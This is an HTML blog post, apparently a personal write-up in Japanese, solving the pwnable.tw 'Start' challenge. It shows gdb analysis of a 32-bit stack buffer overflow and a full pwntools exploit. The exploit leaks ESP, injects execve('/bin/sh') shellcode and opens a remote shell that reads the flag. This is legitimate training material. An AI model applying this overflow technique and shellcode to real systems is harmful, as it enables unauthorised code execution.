@@ -1,0 +1,156 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>pwnable.tw writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="pwnable.twを解いていきます。解けなくても解法はまとめます。
+Start Just a start.
+nc chall.pwnable.tw 10000
+start
+調査 実行ファイルが与えられる。
+file start start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped 実行してみると、文字列が入力できることがわかる。たくさん文字を入力するとSegmentation faultが発生する。
+# ./start Let's start the CTF: # ./start Let's start the CTF:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Segmentation fault gdbで実行してみる。試しに50文字入力してみるとEIPが書き換えられる。
+# gdb -q start gdb-peda$ pattc 50 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA' gdb-peda$ r Starting program: /ctf/Start/start Let's start the CTF:AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0x33 ('3') EBX: 0x0 ECX: 0xffffd7b4 (&#34;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) EDX: 0x3c ('<') ESI: 0x0 EDI: 0x0 EBP: 0x0 ESP: 0xffffd7cc (&#34;(AADAA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) EIP: 0x41412d41 ('A-AA') EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x41412d41 [------------------------------------stack-------------------------------------] 0000| 0xffffd7cc (&#34;(AADAA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0004| 0xffffd7d0 (&#34;AA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0008| 0xffffd7d4 (&#34;A)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0012| 0xffffd7d8 (&#34;EAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0016| 0xffffd7dc (&#34;AA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0020| 0xffffd7e0 (&#34;AFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0024| 0xffffd7e4 --> 0xff0a4162 0028| 0xffffd7e8 --> 0xffffd93a (&#34;HOME=/root&#34;) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x41412d41 in ?"><meta property="og:image" content><meta property="og:title" content="pwnable.tw writeup"><meta property="og:description" content="pwnable.twを解いていきます。解けなくても解法はまとめます。
+Start Just a start.
+nc chall.pwnable.tw 10000
+start
+調査 実行ファイルが与えられる。
+file start start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped 実行してみると、文字列が入力できることがわかる。たくさん文字を入力するとSegmentation faultが発生する。
+# ./start Let's start the CTF: # ./start Let's start the CTF:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Segmentation fault gdbで実行してみる。試しに50文字入力してみるとEIPが書き換えられる。
+# gdb -q start gdb-peda$ pattc 50 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA' gdb-peda$ r Starting program: /ctf/Start/start Let's start the CTF:AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0x33 ('3') EBX: 0x0 ECX: 0xffffd7b4 (&#34;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) EDX: 0x3c ('<') ESI: 0x0 EDI: 0x0 EBP: 0x0 ESP: 0xffffd7cc (&#34;(AADAA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) EIP: 0x41412d41 ('A-AA') EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x41412d41 [------------------------------------stack-------------------------------------] 0000| 0xffffd7cc (&#34;(AADAA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0004| 0xffffd7d0 (&#34;AA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0008| 0xffffd7d4 (&#34;A)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0012| 0xffffd7d8 (&#34;EAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0016| 0xffffd7dc (&#34;AA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0020| 0xffffd7e0 (&#34;AFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0024| 0xffffd7e4 --> 0xff0a4162 0028| 0xffffd7e8 --> 0xffffd93a (&#34;HOME=/root&#34;) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x41412d41 in ?"><meta property="og:type" content="article"><meta property="og:url" content="/posts/37/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-06-26T23:15:47+09:00"><meta property="article:modified_time" content="2023-06-26T23:15:47+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="pwnable.tw writeup"><meta name=twitter:description content="pwnable.twを解いていきます。解けなくても解法はまとめます。
+Start Just a start.
+nc chall.pwnable.tw 10000
+start
+調査 実行ファイルが与えられる。
+file start start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped 実行してみると、文字列が入力できることがわかる。たくさん文字を入力するとSegmentation faultが発生する。
+# ./start Let's start the CTF: # ./start Let's start the CTF:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Segmentation fault gdbで実行してみる。試しに50文字入力してみるとEIPが書き換えられる。
+# gdb -q start gdb-peda$ pattc 50 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA' gdb-peda$ r Starting program: /ctf/Start/start Let's start the CTF:AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0x33 ('3') EBX: 0x0 ECX: 0xffffd7b4 (&#34;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) EDX: 0x3c ('<') ESI: 0x0 EDI: 0x0 EBP: 0x0 ESP: 0xffffd7cc (&#34;(AADAA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) EIP: 0x41412d41 ('A-AA') EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x41412d41 [------------------------------------stack-------------------------------------] 0000| 0xffffd7cc (&#34;(AADAA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0004| 0xffffd7d0 (&#34;AA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0008| 0xffffd7d4 (&#34;A)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0012| 0xffffd7d8 (&#34;EAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0016| 0xffffd7dc (&#34;AA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0020| 0xffffd7e0 (&#34;AFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;) 0024| 0xffffd7e4 --> 0xff0a4162 0028| 0xffffd7e8 --> 0xffffd93a (&#34;HOME=/root&#34;) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x41412d41 in ?"><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>pwnable.tw writeup</h1><div class=meta>Posted on Jun 26, 2023</div></div><nav id=TableOfContents><ol><li><a href=#start>Start</a><ol><li><a href=#調査>調査</a></li><li><a href=#エクスプロイト>エクスプロイト</a></li></ol></li></ol></nav><section class=body><p><a href=https://pwnable.tw/>pwnable.tw</a>を解いていきます。解けなくても解法はまとめます。</p><h1 id=start>Start</h1><blockquote><p>Just a start.</p><p><code>nc chall.pwnable.tw 10000</code></p><p><a href=https://pwnable.tw/static/chall/start>start</a></p></blockquote><h2 id=調査>調査</h2><p>実行ファイルが与えられる。</p><pre tabindex=0><code>file start 
+start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
+</code></pre><p>実行してみると、文字列が入力できることがわかる。たくさん文字を入力すると<code>Segmentation fault</code>が発生する。</p><pre tabindex=0><code># ./start
+Let&#39;s start the CTF:
+
+# ./start
+Let&#39;s start the CTF:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Segmentation fault
+</code></pre><p>gdbで実行してみる。試しに50文字入力してみるとEIPが書き換えられる。</p><pre tabindex=0><code># gdb -q start
+gdb-peda$ pattc 50
+&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA&#39;
+gdb-peda$ r
+Starting program: /ctf/Start/start 
+Let&#39;s start the CTF:AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x33 (&#39;3&#39;)
+EBX: 0x0 
+ECX: 0xffffd7b4 (&#34;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;)
+EDX: 0x3c (&#39;&lt;&#39;)
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0x0 
+ESP: 0xffffd7cc (&#34;(AADAA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;)
+EIP: 0x41412d41 (&#39;A-AA&#39;)
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41412d41
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd7cc (&#34;(AADAA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;)
+0004| 0xffffd7d0 (&#34;AA;AA)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;)
+0008| 0xffffd7d4 (&#34;A)AAEAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;)
+0012| 0xffffd7d8 (&#34;EAAaAA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;)
+0016| 0xffffd7dc (&#34;AA0AAFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;)
+0020| 0xffffd7e0 (&#34;AFAAbA\n\377:\331\377\377E\331\377\377Q\331\377\377`\331\377\377k\331\377\377v\331\377\377\275\331\377\377\237\337\377\377\301\337\377\377\320\337\377\377\331\337\377\377&#34;)
+0024| 0xffffd7e4 --&gt; 0xff0a4162 
+0028| 0xffffd7e8 --&gt; 0xffffd93a (&#34;HOME=/root&#34;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41412d41 in ?? ()
+</code></pre><p>以下から21文字目から4バイトがEIPとなっていることがわかる。</p><pre tabindex=0><code>gdb-peda$ patto &#39;A-AA&#39;
+A-AA found at offset: 20
+</code></pre><p>objdumpで逆アセンブルしてみる。</p><pre tabindex=0><code># objdump --no-show-raw-insn -M intel -d start   
+
+start:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 &lt;_start&gt;:
+ 8048060:       push   esp
+ 8048061:       push   0x804809d
+ 8048066:       xor    eax,eax
+ 8048068:       xor    ebx,ebx
+ 804806a:       xor    ecx,ecx
+ 804806c:       xor    edx,edx
+ 804806e:       push   0x3a465443
+ 8048073:       push   0x20656874
+ 8048078:       push   0x20747261
+ 804807d:       push   0x74732073
+ 8048082:       push   0x2774654c
+ 8048087:       mov    ecx,esp
+ 8048089:       mov    dl,0x14
+ 804808b:       mov    bl,0x1
+ 804808d:       mov    al,0x4
+ 804808f:       int    0x80
+ 8048091:       xor    ebx,ebx
+ 8048093:       mov    dl,0x3c
+ 8048095:       mov    al,0x3
+ 8048097:       int    0x80
+ 8048099:       add    esp,0x14
+ 804809c:       ret    
+
+0804809d &lt;_exit&gt;:
+ 804809d:       pop    esp
+ 804809e:       xor    eax,eax
+ 80480a0:       inc    eax
+ 80480a1:       int    0x80
+</code></pre><p><code>0x0804806e</code>~<code>0x08048082</code>で<code>Let's start CTF:</code>をスタックに格納する。また、<code>0x8048089</code>~<code>0x804808f</code>でcall命令を実行する。ここでは、ecx（=esp）を先頭アドレスとした文字列を0x14（=20）バイト分write（eaxが0x04）する。つまり、標準出力に<code>Let's start CTF:</code>を出力する。</p><p>また、<code>0x8048091</code>~<code>0x8048097</code>でcall命令を実行する。ここでは、標準入力から（ebxが0x00）、60バイト分（edxが0x3c=60）read（eaxが0x03）する。</p><p>20バイトしか書き込めないにもかかわらず、60バイトreadする部分が脆弱性となる。20バイトより多く文字を入力すると、<code>0x804809c</code>でretした際にジャンプする先のアドレス（<code>0x8048061</code>でpushしている<code>0x804809d</code>）が書き変わってしまう。</p><h2 id=エクスプロイト>エクスプロイト</h2><p>EIPを書き換えることで任意のシェルコードを実行するために、以下をひとまとめにした文字列を送信する必要がある。</p><ul><li>適当な20文字</li><li>シェルコードの先頭アドレス</li><li>/bin/shを起動するシェルコード</li></ul><p>アドレス空間のランダム化（ASLR）が有効となっているため、スタック領域の配置がstart実行ごとに変わってしまう。そのため、スタック領域に書き込むシェルコードの先頭アドレスを事前に取得することはできない。つまり、_start関数の実行中に、スタック領域のアドレス、espやebpを取得する必要がある。</p><p>そこで、<code>0x8048060</code>のespをスタックにpushしている部分に着目する。これとEIP書き換えによる任意アドレスへのジャンプを利用して、<code>0x8048087</code>~<code>0x804808f</code>の20バイト分write()を実行し、start実行時のESPを標準出力に出力する。</p><p>あとは、シェルコードの先頭アドレスであるが、start実行時のESP+20バイトのアドレスがシェルコードの先頭アドレスとなる。</p><p>以下、solver。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>leak_esp</span>(r):
+</span></span><span style=display:flex><span>	address_1 <span style=color:#f92672>=</span> p32(<span style=color:#ae81ff>0x08048087</span>)             <span style=color:#75715e># mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80; </span>
+</span></span><span style=display:flex><span>	payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>20</span> <span style=color:#f92672>+</span> address_1
+</span></span><span style=display:flex><span>	print(r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;CTF:&#39;</span>))
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>send(payload)
+</span></span><span style=display:flex><span>	esp <span style=color:#f92672>=</span> u32(r<span style=color:#f92672>.</span>recv()[:<span style=color:#ae81ff>4</span>])
+</span></span><span style=display:flex><span>	print(<span style=color:#e6db74>&#34;Address of ESP: &#34;</span>, hex(esp))
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> esp
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>=</span> asm(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>join([
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;push </span><span style=color:#e6db74>%d</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> u32(<span style=color:#e6db74>&#39;/sh</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>),
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;push </span><span style=color:#e6db74>%d</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> u32(<span style=color:#e6db74>&#39;/bin&#39;</span>),
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;xor edx, edx&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;xor ecx, ecx&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;mov ebx, esp&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;mov eax, 0xb&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;int 0x80&#39;</span>,
+</span></span><span style=display:flex><span>]))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;i386&#39;</span>
+</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;chall.pwnable.tw&#39;</span>, <span style=color:#ae81ff>10000</span>)
+</span></span><span style=display:flex><span>    esp <span style=color:#f92672>=</span> leak_esp(r)
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>20</span>  <span style=color:#f92672>+</span> p32(esp <span style=color:#f92672>+</span> <span style=color:#ae81ff>20</span>) <span style=color:#f92672>+</span> shellcode 
+</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(payload)
+</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>interactive()
+</span></span></code></pre></div><pre tabindex=0><code># python3 solver.py
+solver.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  &#39;push %d&#39; % u32(&#39;/sh\0&#39;),
+solver.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  &#39;push %d&#39; % u32(&#39;/bin&#39;),
+[+] Opening connection to chall.pwnable.tw on port 10000: Done
+solver.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  print(r.recvuntil(&#39;CTF:&#39;))
+b&#34;Let&#39;s start the CTF:&#34;
+Address of ESP:  0xffac1210
+[*] Switching to interactive mode
+$  
+$ pwd
+/
+$ cd /home/start
+$ ls
+flag
+run.sh
+start
+$ cat flag
+FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
+</code></pre></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/ctf>ctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
